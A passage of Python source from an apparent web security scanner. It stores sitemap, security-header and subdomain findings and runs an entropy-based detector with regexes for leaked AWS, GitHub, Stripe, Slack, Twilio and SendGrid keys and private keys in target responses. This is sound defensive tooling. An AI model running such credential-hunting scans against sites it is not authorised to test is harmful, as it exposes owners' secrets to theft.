        conn.execute("INSERT INTO Sitemap (base_url,url) VALUES (?,?)", (base_url, url))
    except Exception as e:
        print_error("write_to_sitemap_database: " + str(e))
    finally:
        conn.close()

def write_to_security_headers_database(domain, present, missing, leaking):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "SecurityHeaders")
        conn.execute(
            "INSERT INTO SecurityHeaders (domain,present,missing,leaking,checked_at) VALUES (?,?,?,?,?)",
            (domain, ", ".join(present), ", ".join(missing), ", ".join(leaking), timestamp()))
    except Exception as e:
        print_error("write_to_security_headers_database: " + str(e))
    finally:
        conn.close()

def write_to_subdomains_database(root_domain, subdomain, ip, status_code):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Subdomains")
        # Only insert if not already known
        existing = conn.execute(
            "SELECT subdomain FROM Subdomains WHERE subdomain=? LIMIT 1", (subdomain,)
        ).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO Subdomains (root_domain,subdomain,ip,status_code,found_at) VALUES (?,?,?,?,?)",
                (root_domain, subdomain, ip, status_code, timestamp()))
    except Exception as e:
        print_error("write_to_subdomains_database: " + str(e))
    finally:
        conn.close()

# ─────────────────────────────────────────────
# Entropy-based secret detection
# ─────────────────────────────────────────────

import math as _math

# ── Shannon entropy ──────────────────────────────────────────────────────────

def _shannon_entropy(data: str) -> float:
    if not data:
        return 0.0
    entropy = 0.0
    length  = len(data)
    for ch in set(data):
        p = data.count(ch) / length
        entropy -= p * _math.log2(p)
    return entropy


# ── Candidate extraction regexes ────────────────────────────────────────────

_ENT_B64_RE   = re.compile(r'[A-Za-z0-9+/]{20,}={0,2}')
_ENT_HEX_RE   = re.compile(r'[0-9a-fA-F]{32,}')
_ENT_ALNUM_RE = re.compile(r'[A-Za-z0-9]{24,}')

# Thresholds per string class.
# base64 raised to 4.8: the previous 4.5 was generating noise from encoded
#   config blobs and CSS data URIs; real tokens score 4.9+.
# hex stays at 4.0: MD5 hashes typically score 3.5–3.8.
# alnum raised to 4.2: short alnum IDs and UUIDs cluster around 3.8–4.1.
_ENT_THRESHOLDS = {
    "base64": 4.8,
    "hex":    4.0,
    "alnum":  4.2,
}

# ── Known secret pattern matching ───────────────────────────────────────────

_ENT_SECRET_PATTERNS: list[tuple[re.Pattern, str, str]] = [
    # (compiled_regex, label, severity)
    (re.compile(r'(?:AKIA|ABIA|ACCA|AROA)[0-9A-Z]{16}'),                             "AWS Access Key ID",       "CRITICAL"),
    (re.compile(r'[0-9a-zA-Z/+]{40}'),                                                "AWS Secret Access Key",   "CRITICAL"),
    (re.compile(r'(?:ghp|gho|ghu|ghs|ghr)_[0-9a-zA-Z]{36}'),                        "GitHub Personal Token",   "CRITICAL"),
    (re.compile(r'sk_live_[0-9a-zA-Z]{24,}'),                                         "Stripe Live Secret Key",  "CRITICAL"),
    (re.compile(r'xox[baprs]-[0-9a-zA-Z\-]{10,}'),                                   "Slack Token",             "HIGH"),
    (re.compile(r'SK[0-9a-fA-F]{32}'),                                                "Twilio Auth Token",       "HIGH"),
    (re.compile(r'SG\.[0-9a-zA-Z_\-]{22}\.[0-9a-zA-Z_\-]{43}'),                     "SendGrid API Key",        "HIGH"),
    (re.compile(r'-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----'),           "Private Key",             "CRITICAL"),
]

# ── False-positive skip patterns ─────────────────────────────────────────────

# Image data URIs — base64 JPEG/PNG headers
_ENT_IMAGE_PREFIXES = ("iVBOR", "/9j/", "R0lGO", "PHN2Z", "AAAB")

# CDN content-addressable filename hashes in script/link src attributes
_ENT_CDN_HASH_RE = re.compile(
    r'[0-9a-f]{8,32}\.(?:min\.js|min\.css|bundle\.js|chunk\.js|\.js|\.css)$',
    re.IGNORECASE,
)

# Cache-busting filename hashes — hex preceded by - or _ and followed by - or .
# e.g. main-a3f2b1c9.js, styles_8e4d2a1f.css, vendor-chunk-1b3e5a7c9d2f.min.js
_ENT_CACHE_HASH_RE = re.compile(r'[-_][0-9a-fA-F]{8,32}[-.]')

# CDN hostnames whose URLs never contain secrets — checked via 200-char context window.
# Includes Google Fonts/CDN and common image CDN services.
_ENT_SKIP_CDN_HOSTS = frozenset({
    # Google
    "fonts.googleapis.com",
    "fonts.gstatic.com",
    "ajax.googleapis.com",
    # Image CDNs
    "cloudinary.com",
    "imgix.net",
    "images.ctfassets.net",
    "cdn.shopify.com",
    "images.unsplash.com",
    "akamaized.net",
    "squarespace-cdn.com",
    "wp.com",
    "gravatar.com",
    "media.giphy.com",
    "twimg.com",
    "fbcdn.net",
    "fbsbx.com",
    "cdninstagram.com",
    "storage.googleapis.com",
})

# Image file extensions — hex adjacent to these is a filename hash, not a secret
_ENT_IMAGE_EXT_RE = re.compile(
    r'\.(?:jpe?g|png|gif|webp|svg|ico|bmp|avif)(?:["\'\s?#>@,)]|$)',
    re.IGNORECASE,
)

# CMS cache-busting image hash filenames:
#   <text>[-_]<hex8+>[-_]<text>.<img_ext>   e.g. hero-a1b2…d4-large.jpg
#   <text>[-_]<hex8+>.<img_ext>             e.g. photo-a1b2…d4.jpg
_ENT_IMG_HASH_RE = re.compile(
    r'[-_][0-9a-fA-F]{8,}(?:[-_][^.\s"\'<>]{0,40})?'
    r'\.(?:jpe?g|png|gif|webp|svg|ico|bmp|avif)',
    re.IGNORECASE,
)

# Ad/session tracking URL parameter names — their values are high-entropy strings
# by design and are never secrets.
_ENT_TRACKING_PARAMS = frozenset({
    "msockid", "msclkid", "fbclid", "gclid", "dclid",
    "twclid", "ttclid", "li_fat_id",
    "_aem_", "_fbc", "_fbp", "igshid",          # Facebook / Instagram tracking
})

# Pre-compiled regex to detect a tracking param assignment immediately before a match.
# Matches patterns like  msclkid=  or  gclid=  at the END of the look-behind window,
# i.e. the candidate is the direct value of the parameter.
_ENT_TRACKING_PARAM_RE = re.compile(
    r'(?:^|[?&])(' + '|'.join(re.escape(p) for p in sorted(_ENT_TRACKING_PARAMS)) + r')=\s*$',
    re.IGNORECASE,
)

# Wider-window regex for Facebook/Instagram tracking params whose values include a
# structured preamble before the high-entropy token (e.g. _fbc=fb.1.TIMESTAMP.TOKEN,
# _fbp=fb.1.TIMESTAMP.RANDOM).  Checked against a 150-char look-behind so the param
# name is found even when several fixed-format segments precede the matched fragment.
# Also catches _aem_ appearing anywhere in the window as a context signal.
_ENT_FB_AEM_PARAM_RE = re.compile(
    r'[?&](?:_aem_|_fbc|_fbp|igshid)=',
    re.IGNORECASE,
)

# Facebook CDN signature query parameters — values adjacent to these are CDN
# cache/auth tokens (never application secrets).
# oh=  image hash / auth signature
# oe=  expiry timestamp (hex)
# _nc_cat / _nc_sid / _nc_ohc / _nc_ht / ccb — CDN routing and cache metadata
_ENT_FB_CDN_PARAM_RE = re.compile(
    r'[?&](?:oh|oe|_nc_cat|_nc_sid|_nc_ohc|_nc_ht|_nc_hash|ccb)=',
    re.IGNORECASE,
)

# Facebook / Instagram CDN domain substrings used for a wider-window (300-char)
# context check.  fbcdn.net is also in _ENT_SKIP_CDN_HOSTS (200-char window),
# but Facebook CDN URLs can be long enough to push the hostname out of that range.
_ENT_FB_DOMAINS = ("facebook.com", "fbcdn.net", "fbsbx.com", "cdninstagram.com")

# Strings that are almost certainly HTML entities or encoded text
_ENT_HTML_ENTITY_RE = re.compile(r'&[a-zA-Z]{2,8};|&#\d{2,5};|&#x[0-9a-fA-F]{2,5};')

# HTML attribute context — the string is a URL or binding value, not a secret.
# Covers: standard URL attributes, any data- attribute, any ng- directive,
# and CSS url() calls.  The look-behind must end with  attr="<partial-value>.
_ENT_URL_ATTR_CTX_RE = re.compile(
    r'(?:href|src|action|data-[a-z][a-z0-9\-]*|ng-[a-z][a-z0-9\-]*|content)'
    r'\s*=\s*["\'][^"\']*$'
    r'|url\s*\(\s*["\']?[^)"\']*$',
    re.IGNORECASE,
)

# CSS property value context — string appears after a CSS property name inside
# a style block or style= attribute; these are font names, colour values, URLs,
# etc., never API keys.
_ENT_CSS_VALUE_RE = re.compile(
    r'(?:background(?:-image|-color)?|content|font(?:-family|-src)?'
    r'|src|border|color|url|transform|animation)\s*:\s*[^;{}<>"\']*$'
    r'|\bstyle\s*=\s*["\'][^"\']*$',
    re.IGNORECASE,
)

# URL query parameter assignment in look-behind — used by the base64url suppressor.
# Matches ?name=  or  &name=  at the end of the look-behind window.
_ENT_QUERY_PARAM_RE = re.compile(r'[?&][^=&\s]{1,50}=\s*$', re.IGNORECASE)

# Character set used when reconstructing the full base64url token length.
_ENT_B64URL_CHARS = frozenset(
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_='
)

# DOM identifier attribute look-behind — matches id=, for=, data-*=, aria-*=
# ending immediately before the candidate value (with optional whitespace/quote).
# These attribute values are generated by frontend frameworks and never secrets.
_ENT_DOM_ID_ATTR_RE = re.compile(
    r'(?:id|for|data-[a-z][a-z0-9\-]*|aria-[a-z][a-z0-9\-]*)\s*=\s*["\']?\s*$',
    re.IGNORECASE,
)

# ── CSP hash suppression ─────────────────────────────────────────────────────

# Immediately-preceding sha256-/sha384-/sha512- prefix
_ENT_CSP_HASH_PREFIX_RE = re.compile(r'sha(?:256|384|512)-\s*$', re.IGNORECASE)

# CSP directive keywords that indicate a string lives inside a CSP context
_ENT_CSP_DIRECTIVE_RE = re.compile(
    r'Content-Security-Policy|script-src|style-src',
    re.IGNORECASE,
)

# ── Meta verification tag suppression ────────────────────────────────────────

# Exact name= values used by search engines / security vendors for domain ownership
_ENT_META_VERIFY_NAMES = frozenset({
    "google-site-verification",
    "msvalidate.01",
    "p:domain_verify",
    "norton-safeweb-site-verification",
    "yandex-verification",
    "baidu-site-verification",
    "facebook-domain-verification",
})

# Keyword patterns that catch vendor-specific names not in the explicit list
_ENT_META_VERIFY_KEYWORDS_RE = re.compile(
    r'verification|validate|confirm',
    re.IGNORECASE,
)

# ── AWS Secret Access Key decoded-content FP check ───────────────────────────

def _aws_b64_decoded_fp(candidate: str) -> bool:
    """
    Return True if a base64 candidate decodes to non-random content, meaning it
    is almost certainly NOT a real AWS Secret Access Key.

    Real AWS SAKs are 30 bytes of random binary data.  Three heuristics catch
    the common false-positive classes:

      1. Valid JSON  — the decoded bytes parse as a JSON object, array, or string.
      2. Hex-only    — decoded UTF-8 text contains only hex digits, brackets,
                       whitespace, and JSON punctuation.
      3. Readable text — >85% of decoded bytes fall in the printable ASCII +
                         whitespace range, indicating structured or human-readable
                         content rather than random key material.

    Returns False (not a FP) when the candidate cannot be base64-decoded, which
    preserves the existing behaviour for truly malformed strings.
    """
    import base64 as _b64
    import json   as _json_mod
    # Pad to a valid multiple-of-4 length
    padded = candidate + "=" * (-len(candidate) % 4)
    try:
        decoded = _b64.b64decode(padded, validate=False)
    except Exception:
        return False  # can't decode — treat as real candidate

    # Heuristic 1: valid JSON
    try:
        parsed = _json_mod.loads(decoded.decode("utf-8", errors="strict"))
        if isinstance(parsed, (dict, list, str)):
            return True
    except Exception:
        pass

    # Heuristic 2: decoded text is hex characters + brackets/whitespace only
    try:
        text = decoded.decode("utf-8", errors="strict")
        if re.fullmatch(r'[0-9a-fA-F\[\]{}\(\)\s,":\']+', text):
            return True
    except Exception:
        pass

    # Heuristic 3: high ratio of printable ASCII → readable text, not random bytes
    printable = sum(
        1 for b in decoded if 0x20 <= b <= 0x7E or b in (0x09, 0x0A, 0x0D)
    )
    if len(decoded) > 0 and printable / len(decoded) > 0.85:
        return True

    return False


# ── Content-type helpers ──────────────────────────────────────────────────────

def _ent_content_type(headers: dict) -> str:
    """Return normalised content-type string from response headers dict."""
    ct = ""
    for k, v in (headers or {}).items():
        if k.lower() == "content-type":
            ct = v.lower()
            break
    return ct


def _ent_scannable(url: str, content_type: str) -> bool:
    """
    Return True if the response is worth entropy-scanning.
    Only scan JSON, HTML, and plain-text responses; skip CSS, images,
    binary content, and known third-party CDN domains.
    """
    if is_third_party_cdn(urlparse(url).netloc):
        return False
    # Skip CSS files and obvious binary/media types
    if any(t in content_type for t in ("css", "image/", "video/", "audio/",
                                        "font/", "application/pdf",
                                        "application/zip", "application/octet")):
        return False
    if url.endswith(".css"):
        return False
    return True  # JSON, HTML, text/plain, text/xml all pass


# ── Dedup set ────────────────────────────────────────────────────────────────

_entropy_seen: set = set()   # first-8-chars prefix of each flagged string


# ── Main check ───────────────────────────────────────────────────────────────

def check_response_entropy(page_url: str, body: str, response_headers: dict) -> None:
    """
    Shannon entropy analysis on HTTP response bodies and headers.

    Extracts Base64, hex, and alphanumeric candidate strings from JSON, HTML
    (excluding inline <script> blocks), and plain-text responses.  Calculates
    Shannon entropy for each candidate and, above per-class thresholds, checks
    for known secret patterns (AWS, GitHub, Stripe, Slack, Twilio, SendGrid,
    private keys) and reports the finding.

    False-positive filters applied before alerting:
      - Strings inside minified inline <script> blocks skipped
      - CDN content-addressable filename hashes skipped
      - HTML entity-encoded content skipped
      - Image data-URI prefixes (JPEG /9j/, PNG iVBOR, etc.) skipped
      - Strings longer than 500 characters skipped
      - Third-party CDN domains skipped entirely
      - Known public key prefixes (Google AIza, Stripe pk_) skipped
      - is_secret_fp() placeholder filter applied

    Severity:
      CRITICAL — matches a known critical-tier secret pattern (AWS, GitHub,
                 Stripe live, private key)
      HIGH     — high entropy string in JSON body, no pattern match
      MEDIUM   — high entropy string in HTML body, no pattern match
      LOW      — high entropy string in response header value

    Deduplicates by the first 8 characters of each flagged string.
    Does not require --active-probes (passive, read-only analysis).
    """
    if not body or not is_in_scope(page_url):
        return

    domain = urlparse(page_url).netloc
    ct = _ent_content_type(response_headers)

    if not _ent_scannable(page_url, ct):
        return

    is_json = "json" in ct
    is_html = "html" in ct or not ct  # treat unknown as HTML

    # ── Strip inline <script> blocks from HTML to avoid minified-JS noise ────
    if is_html:
        scan_body = re.sub(r'<script\b[^>]*>.*?</script>', ' ', body,
                           flags=re.DOTALL | re.IGNORECASE)
    else:
        scan_body = body

    # Determine base severity for body findings (before pattern override)
    body_base_sev = "HIGH" if is_json else "MEDIUM"

    # ── Helper: try to flag a candidate ──────────────────────────────────────
    def _try_flag(candidate: str, string_class: str, source: str, sev_override: str = "") -> None:
        # Length guard
        if len(candidate) > 500:
            return
        # Image data URI prefixes
        if any(candidate.startswith(pfx) for pfx in _ENT_IMAGE_PREFIXES):
            return
        # CDN content-hash filename
        if _ENT_CDN_HASH_RE.search(candidate):
            return
        # Cache-busting filename hash (e.g. main-a3f2b1c9.js, styles_8e4d2a1f.css)
        if string_class == "hex" and _ENT_CACHE_HASH_RE.search(candidate):
            return
        # HTML entities
        if _ENT_HTML_ENTITY_RE.search(candidate):
            return
        # Known false-positive placeholder strings
        if is_secret_fp(candidate):
            return
        # Known public key prefixes
        if is_public_key(candidate):
            return
        # Entropy threshold gate.
        # Strings over 80 chars are likely cryptographic payloads (signatures,
        # encoded tokens, PKCE verifiers) rather than API keys — raise the bar.
        threshold = _ENT_THRESHOLDS.get(string_class, 3.8)
        if len(candidate) > 80:
            threshold = max(threshold, 5.2)
        entropy = _shannon_entropy(candidate)
        if entropy <= threshold:
            return

        # Character distribution check: real secrets have roughly uniform
        # character distribution.  Skip if fewer than 8 distinct characters
        # or any single character accounts for more than 20% of the string.
        unique_chars = len(set(candidate))
        if unique_chars < 8:
            return
        max_freq = max(candidate.count(c) for c in set(candidate))
        if max_freq / len(candidate) > 0.20:
            return

        # Context snippet (20 chars either side) — computed before dedup so that
        # URL-context suppressions don't poison the dedup set.
        pos = scan_body.find(candidate) if source == "body" else -1
        if pos >= 0:
            ctx_start = max(0, pos - 20)
            ctx_end   = pos + len(candidate) + 20
            context   = scan_body[ctx_start:ctx_end].strip()
            pre_ctx   = scan_body[max(0, pos - 80): pos]
            # URL attribute context: href=", src=", data-*, ng-*, url(
            if _ENT_URL_ATTR_CTX_RE.search(pre_ctx):
                return
            # CSS property value context: background:, font:, style="…
            if _ENT_CSS_VALUE_RE.search(pre_ctx):
                return
        else:
            context = candidate[:60]

        # Candidate-level URL character check: protocol separator or
        # percent-encoded sequences indicate URL data, not key material.
        if "://" in candidate or re.search(r'%[0-9A-Fa-f]{2}', candidate):
            return

        # Dedup by 8-char prefix
        dedup_key = candidate[:8]
        if dedup_key in _entropy_seen:
            return
        _entropy_seen.add(dedup_key)

        # Pattern matching — override severity for known secret types
        final_sev   = sev_override or body_base_sev
        secret_type = "high entropy string"
        for pat, label, pat_sev in _ENT_SECRET_PATTERNS:
            if pat.search(candidate):
                if label == "AWS Secret Access Key":
                    # Must be exactly 40 characters — a longer candidate only
                    # contains a 40-char window that matches, not the full value.
                    if len(candidate) != 40:
                        continue
                    # Decode and verify the content looks like random bytes.
                    if _aws_b64_decoded_fp(candidate):
                        return
                secret_type = label
                final_sev   = pat_sev
                break

        # Generic very-high-entropy with no pattern match → still HIGH in JSON
        if secret_type == "high entropy string" and entropy > 4.8:
            final_sev = "HIGH" if is_json else final_sev

        detail = (
            f"High-entropy {string_class} string ({secret_type}) detected in "
            f"{source} of {page_url} | Entropy: {entropy:.2f} | "
            f"Class: {string_class} | Context: {context!r}"
        )
        alert(
            f"HIGH ENTROPY STRING: {secret_type.upper()}",
            final_sev,
            page_url,
            detail,
        )
        print(timestamp() + f" [!] Entropy: {secret_type} (entropy={entropy:.2f}) at {page_url}")

    def _in_cdn_skip_url(m_start: int) -> bool:
        """Return True if the 200-char window around the match contains a CDN hostname."""
        window = scan_body[max(0, m_start - 200): m_start + 200]
        return any(h in window for h in _ENT_SKIP_CDN_HOSTS)

    def _in_tracking_param(m_start: int) -> bool:
        """
        Return True if the match is the value of a known ad/tracking URL param.

        Three suppression paths:
          1. Direct value: the 60-char look-behind ends with  ?param=  or  &param=
             for any name in _ENT_TRACKING_PARAMS (handles fbclid, msclkid, igshid,
             _aem_ when used as a plain ?_aem_=TOKEN query parameter, etc.).
          2. Preamble value: the 150-char look-behind contains ?_aem_=, ?_fbc=,
             ?_fbp=, or ?igshid= anywhere — catches formats like
             _fbc=fb.1.TIMESTAMP.TOKEN where the high-entropy fragment is several
             fixed segments after the = sign.
          3. _aem_ adjacent prefix: the look-behind ends with the literal string
             _aem_, indicating the candidate is the token portion of an _aem_TOKEN
             value that was separated from the underscore-prefixed name.
        """
        pre60  = scan_body[max(0, m_start - 60):  m_start]
        if _ENT_TRACKING_PARAM_RE.search(pre60):
            return True
        pre150 = scan_body[max(0, m_start - 150): m_start]
        if _ENT_FB_AEM_PARAM_RE.search(pre150):
            return True
        if pre60.endswith("_aem_"):
            return True
        return False

    def _in_meta_verification_content(m_start: int) -> bool:
        """
        Return True if the base64 match is the content= value of an HTML <meta>
        domain-verification tag.  Tokens issued by Google, Bing, Pinterest,
        Norton, Yandex, Baidu, and Facebook for site ownership confirmation are
        never AWS secrets.

        Detection (all three must hold):
          1. content= appears immediately before the candidate (optional quote).
          2. An unclosed <meta tag is present in the 600-char look-behind window
             (no '>' has closed the tag between <meta and the candidate).
          3. The tag's name= attribute is either a known verification name
             (_ENT_META_VERIFY_NAMES) or contains a keyword: verification,
             validate, confirm.
        """
        pre = scan_body[max(0, m_start - 600): m_start]
        # Condition 1: content= assignment immediately precedes the candidate
        if not re.search(r'content\s*=\s*["\']?\s*$', pre, re.IGNORECASE):
            return False
        # Condition 2: find the last <meta and verify the tag is still open
        lower_pre = pre.lower()
        last_meta = lower_pre.rfind('<meta')
        if last_meta == -1:
            return False
        tag_segment = pre[last_meta:]
        if '>' in tag_segment:
            return False
        # Condition 3: name= attribute matches a known name or keyword
        name_m = re.search(
            r'\bname\s*=\s*["\']?([^"\'>\s]+)', tag_segment, re.IGNORECASE
        )
        if not name_m:
            return False
        name_val = name_m.group(1).lower()
        return (
            name_val in _ENT_META_VERIFY_NAMES
            or bool(_ENT_META_VERIFY_KEYWORDS_RE.search(name_val))
        )

    def _in_html_input_value(m_start: int) -> bool:
        """
        Return True if the base64 match is the value of an HTML <input> element's
        value attribute.  Form state tokens, CSRF tokens, and session state are
        routinely base64-encoded in hidden inputs and are never AWS secrets.

        Detection: the few characters immediately preceding the match must end
        with  value="  or  value='  (optional whitespace), AND there must be an
        unclosed <input tag in the 400-char look-behind window (i.e. no '>' has
        closed the tag between <input and the current position).
        """
        pre = scan_body[max(0, m_start - 400): m_start]
        # Quick check: value= assignment must be immediately before the candidate
        if not re.search(r'value\s*=\s*["\']?\s*$', pre, re.IGNORECASE):
            return False
        # Verify we are inside an <input tag, not some other element
        lower_pre = pre.lower()
        last_input = lower_pre.rfind('<input')
        if last_input == -1:
            return False
        # If there is a '>' after <input and before our position, the tag is
        # already closed and this value= belongs to a different element
        return '>' not in pre[last_input:]

    def _in_image_filename_context(m_start: int, m_end: int) -> bool:
        """
        Return True if the hex match sits inside an image filename — i.e. it is
        either immediately followed by an image extension (item 1) or is part of
        a CMS cache-busting filename pattern (item 2).

        Item 1: checks the 15 chars immediately after the match end for a
                trailing image extension (.jpg, .png, .webp, etc.).

        Item 2: checks a window of 5 chars before + 80 chars after the match for
                the full CMS pattern  [-_]<hex>[-_<text>].<img_ext>.
        """
        # Item 1 — trailing image extension
        after = scan_body[m_end: m_end + 15]
        if _ENT_IMAGE_EXT_RE.search(after):
            return True
        # Item 2 — CMS cache-busting filename (includes the separator before hex)
        window = scan_body[max(0, m_start - 5): m_end + 80]
        if _ENT_IMG_HASH_RE.search(window):
            return True
        return False

    def _in_url_path_context(m_start: int, m_end: int) -> bool:
        """
        Return True if the match is a URL path segment or the value of a
        URL-carrying HTML attribute — almost certainly a resource identifier,
        not a secret.

        Three detection paths:
          1. Immediately preceded by '/' — the candidate is a URL path component
             sitting between two forward slashes (e.g. /api/v1/<candidate>/details).
          2. Immediately followed by '/' — non-terminal path segment.
          3. Immediately followed by a closing quote AND the 80-char look-behind
             contains a URL attribute assignment (href=", src=", url() — the
             candidate is the terminal path segment inside an href or src value.
        """
        pre_char  = scan_body[m_start - 1: m_start] if m_start > 0 else ""
        post_char = scan_body[m_end: m_end + 1]
        if pre_char == "/":
            return True
        if post_char == "/":
            return True
        if post_char in ('"', "'"):
            pre_window = scan_body[max(0, m_start - 80): m_start]
            if _ENT_URL_ATTR_CTX_RE.search(pre_window):
                return True
        return False

    def _in_fb_cdn_token(m_start: int, m_end: int) -> bool:
        """
        Return True if the match is a Facebook CDN authentication or cache token.

        Path 1 — CDN signature parameter proximity:
          The 300-char window around the match contains a Facebook CDN signature
          query parameter (&oh=, &oe=, &_nc_cat=, &_nc_sid=, etc.).  These params
          appear exclusively in Facebook CDN URLs; any adjacent high-entropy string
          is a CDN token, not an application secret.

        Path 2 — Facebook/Instagram domain in wider window:
          The 300-char window contains a Facebook or Instagram CDN domain
          (facebook.com, fbcdn.net, fbsbx.com, cdninstagram.com).  Catches
          base64url token fragments (alphanumeric parts of `oh=`-style values)
          whose domain is beyond the 200-char range of _in_cdn_skip_url.
        """
        window = scan_body[max(0, m_start - 300): m_end + 300]
        if _ENT_FB_CDN_PARAM_RE.search(window):
            return True
        if any(d in window for d in _ENT_FB_DOMAINS):
            return True
        return False

    def _in_b64url_query_param(m_start: int, m_end: int) -> bool:
        """
        Return True if the match is a fragment of a base64url-encoded string that
        is longer than 60 characters and appears as a URL query parameter value.

        These strings are almost always OAuth tokens, authorization codes,
        cryptographic signatures, or JWT components — never API keys or secrets.

        All three conditions must hold:
          1. The character immediately before or after the match is '-' or '_',
             confirming the match is a segment of a base64url-encoded value
             (base64url uses '-' and '_' as its 62nd and 63rd alphabet characters,
             neither of which appears in _ENT_B64_RE or _ENT_ALNUM_RE, so a
             base64url string is always split into alnum fragments at those chars).
          2. The 150-char look-behind contains a query parameter assignment
             (?name= or &name=) — the value is a URL query param, not body content.
          3. Reconstructing the full base64url token by expanding left and right
             through [A-Za-z0-9_-=] characters gives a total length greater than 60.
        """
        pre_char  = scan_body[m_start - 1: m_start] if m_start > 0 else ""
        post_char = scan_body[m_end: m_end + 1]
        if pre_char not in ('-', '_') and post_char not in ('-', '_'):
            return False
        # Confirm query param context
        if not _ENT_QUERY_PARAM_RE.search(scan_body[max(0, m_start - 150): m_start]):
            return False
        # Reconstruct full token length by expanding past base64url chars
        left = m_start - 1
        while left >= 0 and scan_body[left] in _ENT_B64URL_CHARS:
            left -= 1
        right = m_end
        while right < len(scan_body) and scan_body[right] in _ENT_B64URL_CHARS:
            right += 1
        return (right - left - 1) > 60

    def _in_jwt_component(m_start: int, m_end: int, candidate: str) -> bool:
        """
        Return True if the match is a JWT segment.

        JWTs have the form <header>.<payload>.<signature> where each part is
        base64url-encoded.  Three indicators:
          1. Immediately preceded by '.' — payload or signature segment.
          2. Immediately followed by '.' — header or payload segment.
          3. Candidate starts with 'eyJ' — base64url encoding of '{"', present
             at the start of every JWT header and payload.

        The jwt.io demonstration token header (eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9)
        is caught by condition 3 regardless of surrounding separators.
        """
        pre_char  = scan_body[m_start - 1: m_start] if m_start > 0 else ""
        post_char = scan_body[m_end: m_end + 1]
        if pre_char == "." or post_char == ".":
            return True
        if candidate.startswith("eyJ"):
            return True
        return False

    def _in_dom_id_context(m_start: int, m_end: int) -> bool:
        """
        Return True if the match is the value of a DOM identifier attribute.
        These are generated by frontend frameworks and are never secrets.

        Path 1 — tag-close pattern:
          Candidate is immediately followed by "> or '> — the string is the
          terminal value of an HTML attribute whose tag closes on the next
          character.  This pattern is characteristic of id=, data-*, aria-*,
          and for= attributes (e.g. id="React_app_xyz123"> or
          aria-labelledby="modal-title-abc">).

        Path 2 — DOM-id attribute look-behind:
          The 200-char look-behind ends with an assignment to id=, for=,
          data-<name>=, or aria-<name>= (with optional whitespace and opening
          quote).  Catches non-terminal values such as id="xyz123" where
          additional attributes follow on the same tag.

        Path 3 — name= on a non-input/non-textarea element:
          The 400-char look-behind ends with name= and the last unclosed tag
          in that window is neither <input nor <textarea.  Those elements may
          legitimately carry CSRF tokens or form state values; other elements
          (e.g. <div name=, <span name=) never do.
        """
        # Path 1: terminal attribute value immediately before "> or '>
        post2 = scan_body[m_end: m_end + 2]
        if post2 in ('">', "'>"):
            return True
        # Path 2: DOM-id attribute assignment immediately before candidate
        pre200 = scan_body[max(0, m_start - 200): m_start]
        if _ENT_DOM_ID_ATTR_RE.search(pre200):
            return True
        # Path 3: name= on non-input/non-textarea element
        pre400 = scan_body[max(0, m_start - 400): m_start]
        if re.search(r'\bname\s*=\s*["\']?\s*$', pre400, re.IGNORECASE):
            lower_pre = pre400.lower()
            last_open = lower_pre.rfind('<')
            if last_open != -1 and '>' not in pre400[last_open:]:
                tag_start = pre400[last_open: last_open + 10].lower()
                if not tag_start.startswith(('<input', '<textar')):
                    return True
        return False

    def _in_csp_hash_context(m_start: int) -> bool:
        """
        Return True if the base64 match is a CSP hash or integrity value, not
        a secret.

        Two detection paths:
          1. Immediately preceded by sha256-, sha384-, or sha512- — the candidate
             is the digest portion of a CSP hash expression (e.g. sha256-<b64>).
          2. The 400-char window around the match contains a CSP directive keyword
             (Content-Security-Policy, script-src, or style-src) — the string sits
             inside a CSP header or meta-equiv block where all base64 values are
             integrity hashes, not application secrets.
        """
        pre10 = scan_body[max(0, m_start - 10): m_start]
        if _ENT_CSP_HASH_PREFIX_RE.search(pre10):
            return True
        window = scan_body[max(0, m_start - 400): m_start + 400]
        if _ENT_CSP_DIRECTIVE_RE.search(window):
            return True
        return False

    # ── Scan response body ────────────────────────────────────────────────────
    for m in _ENT_B64_RE.finditer(scan_body):
        if _in_cdn_skip_url(m.start()):
            continue
        if _in_url_path_context(m.start(), m.end()):
            continue
        if _in_fb_cdn_token(m.start(), m.end()):
            continue
        if _in_dom_id_context(m.start(), m.end()):
            continue
        if _in_meta_verification_content(m.start()):
            continue
        if _in_html_input_value(m.start()):
            continue
        if _in_jwt_component(m.start(), m.end(), m.group()):
            continue
        if _in_csp_hash_context(m.start()):
            continue
        _try_flag(m.group(), "base64", "body")
    for m in _ENT_HEX_RE.finditer(scan_body):
        if _in_cdn_skip_url(m.start()):
            continue
        if _in_url_path_context(m.start(), m.end()):
            continue
        if _in_tracking_param(m.start()):
            continue
        if _in_image_filename_context(m.start(), m.end()):
            continue
        if _in_dom_id_context(m.start(), m.end()):
            continue
        _try_flag(m.group(), "hex", "body")
    for m in _ENT_ALNUM_RE.finditer(scan_body):
        if _in_cdn_skip_url(m.start()):
            continue
        if _in_url_path_context(m.start(), m.end()):
            continue
        if _in_fb_cdn_token(m.start(), m.end()):
            continue
        if _in_tracking_param(m.start()):
            continue
        if _in_b64url_query_param(m.start(), m.end()):
            continue
        if _in_dom_id_context(m.start(), m.end()):
            continue
        if _in_jwt_component(m.start(), m.end(), m.group()):
            continue
        if _in_csp_hash_context(m.start()):
            continue
        # Only flag alnum if it wasn't already caught by B64/hex
        val = m.group()
        if not _ENT_B64_RE.fullmatch(val) and not _ENT_HEX_RE.fullmatch(val):
            _try_flag(val, "alnum", "body")

    # ── Scan response headers ─────────────────────────────────────────────────
    skip_headers = frozenset({
        "content-type", "content-length", "content-encoding", "transfer-encoding",
        "cache-control", "vary", "date", "last-modified", "etag", "expires",
        "access-control-allow-origin", "strict-transport-security",
        "x-content-type-options", "x-frame-options", "referrer-policy",
        "permissions-policy", "server", "via", "age", "connection",
        # Cookie headers — values are session tokens by design, not leaked secrets.
        "set-cookie", "cookie",
        # Reporting headers — values are endpoint URLs and group names, not secrets.
        "report-to", "reporting-endpoints",
    })
    for hdr_name, hdr_val in (response_headers or {}).items():
        if hdr_name.lower() in skip_headers:
            continue
        # Skip Content-Security-Policy headers entirely — all base64 values in
        # them are sha256-/sha384-/sha512- integrity hashes, never secrets.
